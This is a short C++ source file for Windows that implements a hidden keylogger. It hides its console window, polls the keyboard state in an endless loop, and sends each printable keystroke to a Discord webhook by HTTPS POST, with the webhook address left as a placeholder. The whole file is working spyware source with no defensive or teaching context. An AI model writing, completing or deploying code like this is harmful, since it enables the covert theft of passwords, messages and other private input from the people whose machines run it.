#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
const std::string WEBHOOK_URL = "webhook link";
void sendCharToWebhook(char value) {
    if (isprint(value)) {
        HINTERNET hSession = InternetOpenA("HTTP_Request", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hSession) {
            HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                const char* headers = "Content-Type: application/json";
                std::string postData = "{\"content\":\"" + std::string(1, value) + "\"}";
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "your part of webhook after discord.com", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

                if (hRequest) {
                    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)postData.c_str(), postData.length());

                    if (bRequestSent) {
                        std::cout << "Char value sent to webhook: " << value << std::endl;
                    }
                    else {
                        std::cerr << "Failed to send request. Error: " << GetLastError() << std::endl;
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hSession);
        }
        else {
            std::cerr << "Failed to open internet session. Error: " << GetLastError() << std::endl;
        }
    }
}

using namespace std;

void StartLogging();

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    StartLogging();
    return 0;
}

void StartLogging() {
    char c;
    while (true) {
        for (c = 1; c <= 254; c++) {
            if (GetAsyncKeyState(c) & 0x1) {
                sendCharToWebhook(c);
            }
        }
    }
}
